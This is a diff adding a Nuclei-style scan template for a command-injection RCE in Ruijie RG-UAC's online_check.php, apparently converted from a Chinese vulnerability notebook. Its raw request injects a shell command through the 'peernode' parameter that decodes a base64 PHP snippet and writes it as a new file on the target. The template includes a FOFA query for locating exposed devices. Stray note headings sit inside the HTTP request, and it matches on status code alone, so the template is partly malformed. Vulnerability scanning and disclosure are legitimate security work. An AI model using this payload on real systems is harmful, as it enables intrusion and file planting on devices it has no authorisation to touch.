@@ -1,0 +1,49 @@
+id: poc-di3kklmo31uxoxox
+info:
+  name: 锐捷Ruijie-UAC online_check.php RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/di3kklmo31uxoxox'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: di3kklmo31uxoxox
+    fofa: title="RG-UAC登录页面"
+http:
+- raw:
+  - 'GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgcGhwaW5mbygpOw==%20|%20base64%20-d%20%3E%20dudesite.php` HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /view/vpn/autovpn/dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
